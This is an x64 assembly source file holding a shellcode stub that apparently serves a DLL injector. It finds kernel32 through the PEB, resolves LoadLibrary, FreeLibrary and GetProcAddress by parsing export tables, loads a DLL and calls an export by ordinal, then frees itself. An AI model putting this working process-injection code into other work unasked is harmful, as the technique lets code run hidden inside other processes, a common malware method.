[org 0]
[bits 64]

; 0:000> dt expeb!Package
;    +0x000 InitialCode      : [2048] UChar
;    +0x800 DllPath          : [260] Uint2B
;    +0xa08 peb              : Ptr64 _PEB
;    +0xa10 kernel32         : Ptr64 Void
;    +0xa18 xxxLoadLibrary   : Ptr64 Void
;    +0xa20 xxxFreeLibrary   : Ptr64 Void
;    +0xa28 xxxGetProcAddress : Ptr64 Void
;    +0xa30 Context          : [1] UChar
;
ShellCode:
mov     qword [rsp+8],rbx
mov     qword [rsp+10h],rsi
push    rdi
sub     rsp,30h

mov     rax,qword [gs:30h]
mov     rbx,rcx
xor     edi,edi
mov     rdx,qword [rax+60h]
mov     qword [rcx+0A08h],rdx
call    GetImageBase
mov     rcx,qword [rbx+0A10h]
mov     rdx,rbx
call    GetProcAddress
lea     rcx,[rbx+800h]
call    qword [rbx+0A18h] ; LoadLibrary
mov     rsi,rax
test    rax,rax
je      Cleanup_ShellCode

mov     edx,0DEADh        ; Ordinal
mov     rcx,rax
call    qword [rbx+0A28h] ; GetProcAddress
test    rax,rax
je      labelFreeLibrary

mov     rcx,rbx
call    rax
mov     edi,eax

labelFreeLibrary:
mov     rcx,rsi
call    qword [rbx+0A20h] ; FreeLibrary

Cleanup_ShellCode:
mov     dword [rsp+20h], 74697845h
mov     dword [rsp+24h], 65726854h
mov     qword [rsp+28h], 00006461h

mov     rcx,qword [rbx+0A10h]
lea     rdx, [rsp+20h]
call    qword [rbx+0A28h] ; GetProcAddress("ExitThread")
mov     rdi, rax

mov     dword [rsp+28h], 74726956h
mov     dword [rsp+2Ch], 466c6175h
mov     dword [rsp+30h], 00656572h
mov     rcx,qword [rbx+0A10h]
lea     rdx, [rsp+28h]
call    qword [rbx+0A28h] ; GetProcAddress("VirtualFree")

xor     edx,edx
mov     r8d,8000h
mov     rcx,rbx
push    rdi
jmp     rax

int3

GetImageBase:
mov     rax,qword [rcx+0A08h]   ; rax = PEB
mov     r8,qword [rax+18h]      ; PEB::Ldr
mov     rdx,qword [r8+20h]      ; PEB::Ldr->InMemoryOrderModuleList
add     r8,20h
cmp     rdx,r8
je      Exit_GetImageBase

mov     r9,qword [rcx+0A10h]
nop

GetImageBase_Loop:
mov     rax,qword [rdx+50h]
test    r9,r9
jne     GetImageBase_Lower

cmp     dword [rax],45004Bh
jne     GetImageBase_Lower

cmp     dword [rax+4],4E0052h
jne     GetImageBase_Lower

cmp     dword [rax+8],4C0045h
jne     GetImageBase_Lower

cmp     dword [rax+0Ch],320033h
jne     GetImageBase_Lower

cmp     word [rax+10h],2Eh
je      GetImageBase_Found

GetImageBase_Lower:
cmp     dword [rax],65006Bh
jne     GetImageBase_Continue

cmp     dword [rax+4],6E0072h
jne     GetImageBase_Continue

cmp     dword [rax+8],6C0065h
jne     GetImageBase_Continue

cmp     dword [rax+0Ch],320033h
jne     GetImageBase_Continue

cmp     word [rax+10h],2Eh
jne     GetImageBase_Continue

GetImageBase_Found:
mov     r9,qword [rdx+20h]
mov     qword [rcx+0A10h],r9
jmp     Exit_GetImageBase

GetImageBase_Continue:
mov     rdx,qword [rdx]
cmp     rdx,r8
jne     GetImageBase_Loop

Exit_GetImageBase:
ret

int3

GetProcAddress:
sub     rsp,8
mov     eax,5A4Dh
mov     r10,rdx
mov     r11,rcx
cmp     word [rcx],ax
jne     GetProcAddres_Exit

mov     r9d,dword [rcx+3Ch]
cmp     dword [r9+rcx],4550h
jne     GetProcAddres_Exit

movzx   r8d,word [r9+rcx+4]
mov     edx,14Ch
cmp     r8w,dx
je      GetProcAddress_LoopStart

mov     eax,8664h
cmp     r8w,ax
jne     GetProcAddres_Exit

GetProcAddress_LoopStart:
mov     qword [rsp+18h],rbp
cmp     r8w,dx
mov     qword [rsp+20h],rsi
mov     qword [rsp],rdi
mov     eax,70h
mov     ecx,60h
cmove   eax,ecx
xor     r8d,r8d
add     rax,r9
mov     r9d,dword [rax+r11+18h]
add     r9,r11
mov     edi,dword [r9+20h]
mov     esi,dword [r9+24h]
mov     ebp,dword [r9+1Ch]
add     rdi,r11
add     rsi,r11
add     rbp,r11
cmp     dword [r9+18h],r8d
jbe     GetProcAddres_LoopEnd

mov     qword [rsp+10h],rbx
mov     rbx,qword [r10+0A18h]
nop     dword [rax]
nop     word [rax+rax]

GetProcAddress_Loop:
movzx   ecx,word [rsi+r8*2]
mov     eax,dword [rdi+r8*4]
mov     edx,dword [rbp+rcx*4]
add     rax,r11
add     rdx,r11
test    rbx,rbx
jne     label_FreeLibrary

cmp     dword [rax],64616F4Ch
jne     label_FreeLibrary

cmp     dword [rax+4],7262694Ch
jne     label_FreeLibrary

cmp     dword [rax+8],57797261h
jne     label_FreeLibrary

cmp     byte [rax+0Ch],bl
jne     label_FreeLibrary

mov     rbx,rdx
mov     qword [r10+0A18h],rdx
jmp     GetProcAddress_Continue

label_FreeLibrary:
cmp     qword [r10+0A20h],0
jne     label_GetProcAddress

cmp     dword [rax],65657246h
jne     label_GetProcAddress

cmp     dword [rax+4],7262694Ch
jne     label_GetProcAddress

cmp     dword [rax+8],797261h
jne     label_GetProcAddress

mov     qword [r10+0A20h],rdx
jmp     GetProcAddress_Continue

label_GetProcAddress:
cmp     qword [r10+0A28h],0
jne     GetProcAddress_Continue

cmp     dword [rax],50746547h
jne     GetProcAddress_Continue

cmp     dword [rax+4],41636F72h
jne     GetProcAddress_Continue

cmp     dword [rax+8],65726464h
jne     GetProcAddress_Continue

mov     ecx,dword [rax+0Ch]
and     ecx,0FFFFFFh
cmp     ecx,7373h
jne     GetProcAddress_Continue

mov     qword [r10+0A28h],rdx

GetProcAddress_Continue:
inc     r8d
cmp     r8d,dword [r9+18h]
jb      GetProcAddress_Loop

mov     rbx,qword [rsp+10h]

GetProcAddres_LoopEnd:
mov     rsi,qword [rsp+20h]
mov     rbp,qword [rsp+18h]
mov     rdi,qword [rsp]

GetProcAddres_Exit:
add     rsp,8
ret

int3
